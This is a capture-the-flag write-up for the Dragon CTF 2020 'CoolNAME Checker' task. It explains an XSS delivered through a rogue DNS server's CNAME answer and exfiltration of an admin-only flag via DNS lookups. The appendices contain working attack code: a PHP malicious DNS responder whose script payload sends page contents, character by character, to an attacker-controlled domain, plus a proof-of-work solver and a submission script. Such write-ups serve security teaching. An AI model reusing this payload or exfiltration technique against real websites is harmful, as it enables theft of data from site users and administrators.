# CoolNAME Checker - Dragon CTF 2020 (Network, 324p, 19 solved)

## Introduction
CoolNAME Checker is a network task.

There is a web server with a form asking for an IP address. The server will
contact the IP address submitted to resolve a randomly-generated domain name.

The form has a checkbox to request that an admin comes and a proof of work. The
flag is only displayed to the administrator.

## Vulnerability
When providing an IP address to the web server, it will make a `CNAME` query of
a randomly-generated domain name. If the answer is valid, it will be displayed.

The presence of a proof-of-work and a checkbox hints that the vulnerability is
an XSS -- and it is: crafting a DNS server that answers
`<script>alert(1)</script>` is enough to confirm that there is an XSS
vulnerability.

## Exploitation
The flag is only displayed to the administrator, in the HTML element with the
`flag` id. It can be obtained from `flag.textContent`.

The only problem is that the administrator is protected by a firewall that
blocks every outgoing connections, except for UDP port 53 (DNS requests). The
flag has to be exfiltrated with DNS requests.

DNS domains are case-insensitive and limited in length. It is thus not possible
to just query a domain with the flag in one of its sub domain, or use base64
encoding.

The solution used here is to make multiple requests to
`$idx-$char.example.org` in a loop with `$idx` the index of the loop and `$char`
the ASCII number of the `$idx`th character of the string.

The request is relatively short lived, so leaking the whole flag in one go is
not possible with this technique. Instead it is required to make multiple
requests to leak parts of the flags.

**Flag**: `DrgnS{MustLuuuuvDNS_dontYa}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php
const PORT = 5353;

$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
socket_setopt($socket, SOL_SOCKET, SO_REUSEADDR, true);
socket_bind($socket, "0.0.0.0", PORT);

while(true) {
	socket_recvfrom($socket, $packet, 0xFFFF, 0, $addr, $port);

	$p = unpack("n6", $packet);

	$query  = substr($packet, 12, 6 + 3 + 1 + 4);
	$domain = substr($packet, 0, -4);

	$size = ord($domain[12]);
	printf("%s\n", substr($domain, 13, $size));

	$resp  = "";
	$resp .= pack("n", $p[1]); // id
	$resp .= pack("n", 0x8180); // flags
	$resp .= pack("n", 1); // 1 query
	$resp .= pack("n", 1); // 2 answers
	$resp .= pack("n", 0); // 0 authority
	$resp .= pack("n", 0); // 0 additional


	// answer
	$resp .= $query;

	$domain = [
		'<script>f=flag',
		'textContent;for(i=0;i<f',
		'length;i++)fetch(`//${i}-${f',
		'charCodeAt(i)}',
		'ds',
		'xer',
		'fr`)</script>',
	];

	$payload = "";
	foreach($domain as $d)
		$payload .= chr(strlen($d)) . $d;
	$payload .= "\x00";

	$resp .= "\xc0\x0c";
	$resp .= pack("n", 5); // cname
	$resp .= pack("n", 1); // in
	$resp .= pack("N", 0); // ttl
	$resp .= pack("n", strlen($payload)); // length
	$resp .= $payload;

	socket_sendto($socket, $resp, strlen($resp), 0, $addr, $port);
}
```

### pow.php
```php
#!/usr/bin/php
<?php
$i     = 0;
$nonce = $argv[1];
while(false === strpos(sha1("$nonce$i"), "313377"))
	$i++;

printf("%s\n", $i);
```

### pwn.sh
```sh
#!/bin/sh
nonce=$(curl http://reverse-lookup.hackable.software/ \
	| grep -oP '(?<="nonce" value=")[^"]+')
echo "nonce = $nonce"

pow=$(./pow.php "$nonce")
echo "pow = $pow"

exec curl -vv http://reverse-lookup.hackable.software/query? \
	--data-urlencode "nonce=$nonce" \
	--data-urlencode "pow=$pow" \
	--data-urlencode "srv=$1" \
	--data-urlencode 'for_admin=ON'
```

### flag.php
```php
<?php
$bits = [
	"0-84", "1-104", "2-101", "3-32",
	"4-102", "5-108", "6-97", "7-103",
	"8-32", "9-105", "10-115", "11-32",
	"12-58", "13-32", "14-68", "15-114",
	"16-103", "17-110", "18-83", "19-123",
	"20-77", "21-117", "22-115", "23-116",
	"24-76", "25-117", "26-117", "27-117",
	"28-117", "29-118", "30-68", "31-78",
	"32-83", "33-95", "34-100", "35-111",
	"36-110", "37-116", "38-89", "39-97",
	"40-125",
];

foreach($bits as $s) {
	$c = explode("-", $s)[1];
	echo chr($c);
}
```
